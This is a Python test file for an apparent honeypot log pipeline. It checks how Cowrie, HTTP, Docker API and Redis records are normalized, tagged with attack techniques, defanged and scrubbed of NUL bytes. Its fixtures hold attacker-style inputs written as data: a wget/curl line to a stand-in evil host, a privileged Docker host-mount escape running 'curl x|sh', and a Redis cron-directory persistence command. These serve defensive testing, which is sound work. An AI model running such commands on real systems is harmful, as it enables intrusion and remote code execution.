import json
from datetime import datetime, timezone
from pathlib import Path

from honeyjar.config import RULES_DIR
from honeyjar.defang import defang
from honeyjar.normalize import normalize
from honeyjar.rules import RuleEngine
from honeyjar.schemas import Event, scrub
from honeyjar.worker import Enricher

FIXTURES = Path(__file__).parent / "fixtures"


def cowrie_lines():
    return [json.loads(line) | {"honeypot": "cowrie"}
            for line in (FIXTURES / "cowrie.json").read_text().splitlines() if line.strip()]


def test_cowrie_session_is_normalized_and_enriched():
    enricher = Enricher(RuleEngine(RULES_DIR), geo=None)
    events = [e for e in (enricher.enrich(r, "s1") for r in cowrie_lines()) if e]
    types = [e.event_type for e in events]
    assert types == ["connect", "client_info", "login_attempt", "login_attempt", "command", "command",
                     "download", "session_closed"]
    # protocol / port from the connect event are carried onto later events of the session
    assert all(e.proto == "ssh" and e.dst_port == 22 for e in events)
    failed, ok = events[2], events[3]
    assert (failed.username, failed.password, failed.login_success) == ("root", "123456", False)
    assert ok.login_success is True and "T1078" in ok.techniques
    assert "T1082" in events[4].techniques
    assert {"T1105", "T1222.002"} <= set(events[5].techniques)
    assert events[6].payload_hash.startswith("a1b2")


def test_unknown_records_are_dropped():
    assert normalize({"honeypot": "cowrie", "eventid": "cowrie.log.closed", "src_ip": "1.2.3.4"}, "s") is None
    assert normalize({"honeypot": "nope"}, "s") is None
    assert normalize({"honeypot": "http"}, "s") is None


def test_http_record_extracts_credentials():
    raw = {"honeypot": "http", "ts": "2026-10-28T10:00:00Z", "src_ip": "203.0.113.9", "src_port": 51000,
           "dst_port": 80, "method": "POST", "path": "/wp-login.php",
           "headers": {"User-Agent": "Mozilla/5.0"}, "body": "log=admin&pwd=letmein",
           "creds": {"username": "admin", "password": "letmein", "source": "form"}}
    ev = normalize(raw, "s1")
    assert (ev.username, ev.password, ev.http_ua, ev.proto) == ("admin", "letmein", "Mozilla/5.0", "http")


def test_defang():
    assert defang("wget http://1.2.3.4/x; curl https://evil.example/a") == \
        "wget hxxp://1[.]2[.]3[.]4/x; curl hxxps://evil.example/a"
    assert defang(None) is None


def test_docker_api_calls_become_cli_commands():
    base = {"honeypot": "http", "ts": "2026-10-28T10:00:00Z", "src_ip": "203.0.113.9", "dst_port": 2375,
            "persona": "docker", "headers": {}}
    create = normalize(base | {"method": "POST", "path": "/v1.41/containers/create", "body": json.dumps(
        {"Image": "alpine", "Cmd": ["chroot", "/mnt", "sh", "-c", "curl x|sh"],
         "HostConfig": {"Binds": ["/:/mnt"], "Privileged": True}})}, "s1")
    assert create.command == "docker run --privileged -v /:/mnt alpine chroot /mnt sh -c curl x|sh"
    pull = normalize(base | {"method": "POST", "path": "/images/create?fromImage=kinsing%2Fx&tag=latest"}, "s1")
    assert pull.command == "docker pull kinsing/x:latest"
    exe = normalize(base | {"method": "POST", "path": "/containers/4f1c9b2e8d0a77/exec",
                            "body": '{"Cmd":["sh","-c","id"]}'}, "s1")
    assert exe.command == "docker exec 4f1c9b2e8d0a sh -c id"
    assert normalize(base | {"method": "GET", "path": "/version"}, "s1").command is None


def test_tcp_service_records():
    base = {"honeypot": "http", "ts": "2026-10-28T10:00:00Z", "src_ip": "203.0.113.9", "src_port": 40000,
            "dst_port": 6379, "service": "redis", "session": "ab12"}
    cmd = normalize(base | {"event": "command", "command": "config set dir /var/spool/cron"}, "s1")
    assert (cmd.honeypot, cmd.proto, cmd.event_type, cmd.session_id) == ("redis", "redis", "command", "ab12")
    auth = normalize(base | {"event": "login", "username": "default", "password": "foobared"}, "s1")
    assert (auth.event_type, auth.password, auth.login_success) == ("login_attempt", "foobared", False)
    dl = normalize(base | {"service": "adb", "dst_port": 5555, "event": "download", "sha256": "ab" * 32,
                           "path": "/data/local/tmp/x", "size": 1024}, "s1")
    assert (dl.event_type, dl.payload_hash, dl.extra["size"]) == ("download", "ab" * 32, 1024)
    assert normalize(base | {"event": "bogus"}, "s1") is None


def test_nul_bytes_are_kept_visible_not_stored_raw():
    # Postgres rejects NUL in text and jsonb; one such login once crash-looped the worker.
    enricher = Enricher(RuleEngine(RULES_DIR), geo=None)
    raw = {"honeypot": "cowrie", "eventid": "cowrie.login.failed", "timestamp": "2026-10-30T10:58:00Z",
           "src_ip": "203.0.113.9", "session": "s1", "username": "root\x00", "password": "\x00\x00admin"}
    ev = enricher.enrich(raw, "t")
    assert ev.username == "root\\x00" and ev.password == "\\x00\\x00admin"
    for v in (ev.username, ev.password, *map(str, ev.extra.values())):
        assert "\x00" not in v


def test_scrub_reaches_nested_extra():
    ev = Event(ts=datetime.now(timezone.utc), sensor_id="t", honeypot="http", event_type="http_request",
               src_ip="203.0.113.9", http_path="/a\x00b", extra={"k\x00": ["v\x00"]})
    scrub(ev)
    assert ev.http_path == "/a\\x00b" and ev.extra == {"k\\x00": ["v\\x00"]}
